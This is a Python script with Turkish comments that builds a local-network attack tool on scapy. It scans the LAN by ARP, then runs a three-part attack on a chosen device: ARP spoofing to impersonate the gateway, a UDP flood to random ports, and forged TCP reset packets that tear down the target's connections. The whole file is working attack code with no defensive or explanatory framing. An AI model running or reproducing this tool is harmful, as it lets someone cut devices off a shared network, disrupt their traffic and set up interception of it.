import scapy.all as scapy
import socket
import threading
import time
import random
import sys

class NetworkEngine:
    def __init__(self):
        self.is_attacking = False

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def scan_devices(self):
        my_ip = self.get_local_ip()
        # Modemin genellikle .1 ile bittiğini varsayıyoruz
        gateway_ip = ".".join(my_ip.split(".")[:-1]) + ".1"
        base_ip = ".".join(my_ip.split(".")[:-1]) + ".0/24"
        
        # Kartı uyandır
        scapy.send(scapy.IP(dst="8.8.8.8")/scapy.ICMP(), verbose=False, count=1)
        
        # Tarama başlat
        ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=base_ip), 
                        timeout=4, verbose=False, inter=0.1)[0]
        
        devices = []
        found_ips = []

        # 1. Aşama: Ağdan gelen gerçek yanıtları işle
        for _, recv in ans:
            ip_addr = recv.psrc
            found_ips.append(ip_addr)
            
            label = ""
            if ip_addr == my_ip:
                label = " (Senin Cihazın)"
            elif ip_addr == gateway_ip:
                label = " (Modem / Gateway)"
            
            devices.append({
                "ip": ip_addr,
                "display_ip": f"{ip_addr}{label}",
                "mac": recv.hwsrc
            })

        # 2. Aşama: Eğer MODEM yanıt vermediyse (gizliyse) zorla ekle
        if gateway_ip not in found_ips:
            devices.insert(0, { # Listenin en başına koy
                "ip": gateway_ip,
                "display_ip": f"{gateway_ip} (Modem / Gateway)",
                "mac": "Bilinmiyor (Gizli)"
            })

        # 3. Aşama: Eğer SEN listede yoksan zorla ekle
        if my_ip not in found_ips:
            devices.append({
                "ip": my_ip,
                "display_ip": f"{my_ip} (Senin Cihazın)",
                "mac": "Kendi Kartın"
            })
            
        return devices

    def start_attack(self, target_ip, gateway_ip):
        self.is_attacking = True
        print(f"\n[!] ÜÇLÜ KOMBO SALDIRI BAŞLATILDI: {target_ip}")
        threading.Thread(target=self._arp_spoof, args=(target_ip, gateway_ip), daemon=True).start()
        threading.Thread(target=self._udp_flood, args=(target_ip,), daemon=True).start()
        threading.Thread(target=self._tcp_reset_sniff, args=(target_ip,), daemon=True).start()

    def stop_attack(self):
        self.is_attacking = False
        print("\n[!] TÜM SALDIRILAR DURDURULDU.")

    def _arp_spoof(self, target_ip, gateway_ip):
        try:
            target_mac = scapy.getmacbyip(target_ip)
            gateway_mac = scapy.getmacbyip(gateway_ip)
            if not target_mac or not gateway_mac: return

            arp_target = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            
            while self.is_attacking:
                scapy.sendp(arp_target, verbose=False, count=2)
                time.sleep(0.5)
        except: pass

    def _udp_flood(self, target_ip):
        try:
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            while self.is_attacking:
                for _ in range(10):
                    udp_sock.sendto(payload, (target_ip, random.randint(1, 65535)))
                time.sleep(0.1)
        except: pass

    def _tcp_reset_sniff(self, target_ip):
        def reset_pkt(pkt):
            if pkt.haslayer(scapy.TCP) and pkt[scapy.IP].src == target_ip:
                rst = scapy.IP(src=pkt[scapy.IP].dst, dst=pkt[scapy.IP].src) / \
                      scapy.TCP(sport=pkt[scapy.TCP].dport, dport=pkt[scapy.TCP].sport, flags="R", seq=pkt[scapy.TCP].ack)
                scapy.send(rst, verbose=False)
                sys.stdout.write(f"\r[MULTI-ATTACK] Paketler Gönderiliyor... (TCP Reset Aktif)")
                sys.stdout.flush()

        scapy.sniff(filter=f"ip src {target_ip} and not ip dst {self.get_local_ip()}", 
                    prn=reset_pkt, 
                    stop_filter=lambda x: not self.is_attacking)